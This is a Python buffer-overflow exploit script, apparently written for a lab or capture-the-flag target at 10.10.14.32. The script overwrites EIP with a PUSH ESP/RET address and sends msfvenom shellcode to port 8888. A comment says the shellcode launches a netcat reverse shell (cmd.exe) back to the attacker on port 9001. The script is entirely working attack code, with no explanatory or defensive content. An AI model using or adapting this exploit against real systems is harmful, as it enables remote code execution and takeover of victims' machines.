import socket

target = "10.10.14.32"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

# msfvenom -a x86 -p windows/exec CMD="C:/Temp/nc64.exe -e cmd.exe 10.10.14.32 9001" -b '\x00\x0A\x0D' -f python
buf =  b""
buf += b"\xbd\xb3\x4b\x77\x8e\xda\xc9\xd9\x74\x24\xf4\x58\x31"
buf += b"\xc9\xb1\x3a\x83\xc0\x04\x31\x68\x0f\x03\x68\xbc\xa9"
buf += b"\x82\x72\x2a\xaf\x6d\x8b\xaa\xd0\xe4\x6e\x9b\xd0\x93"
buf += b"\xfb\x8b\xe0\xd0\xae\x27\x8a\xb5\x5a\xbc\xfe\x11\x6c"
buf += b"\x75\xb4\x47\x43\x86\xe5\xb4\xc2\x04\xf4\xe8\x24\x35"
buf += b"\x37\xfd\x25\x72\x2a\x0c\x77\x2b\x20\xa3\x68\x58\x7c"
buf += b"\x78\x02\x12\x90\xf8\xf7\xe2\x93\x29\xa6\x79\xca\xe9"
buf += b"\x48\xae\x66\xa0\x52\xb3\x43\x7a\xe8\x07\x3f\x7d\x38"
buf += b"\x56\xc0\xd2\x05\x57\x33\x2a\x41\x5f\xac\x59\xbb\x9c"
buf += b"\x51\x5a\x78\xdf\x8d\xef\x9b\x47\x45\x57\x40\x76\x8a"
buf += b"\x0e\x03\x74\x67\x44\x4b\x98\x76\x89\xe7\xa4\xf3\x2c"
buf += b"\x28\x2d\x47\x0b\xec\x76\x13\x32\xb5\xd2\xf2\x4b\xa5"
buf += b"\xbd\xab\xe9\xad\x53\xbf\x83\xef\x39\x3e\x11\x8a\x0f"
buf += b"\x40\x29\x95\x3f\x29\x18\x1e\xd0\x2e\xa5\xf5\x95\xc1"
buf += b"\xef\x54\xbf\x49\xb6\x0c\x82\x17\x49\xfb\xc0\x21\xca"
buf += b"\x0e\xb8\xd5\xd2\x7a\xbd\x92\x54\x96\xcf\x8b\x30\x98"
buf += b"\x7c\xab\x10\xfb\xb8\x7c\xcf\x99\xd1\xf2\xc0\x0f\x4a"
buf += b"\xc5\x2a\xfe\xe9\x51\x36\xde\xdc\xc4\x98\x7d\x73\x63"
buf += b"\xf7\xe4\xf3\x0e\x27\xd6\x33\xff\x16\x28\x1d\xce\x6c"
buf += b"\x66\x52\x02\xad\x4f\xa4\x52\x9c\xaf"
payload = buf

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)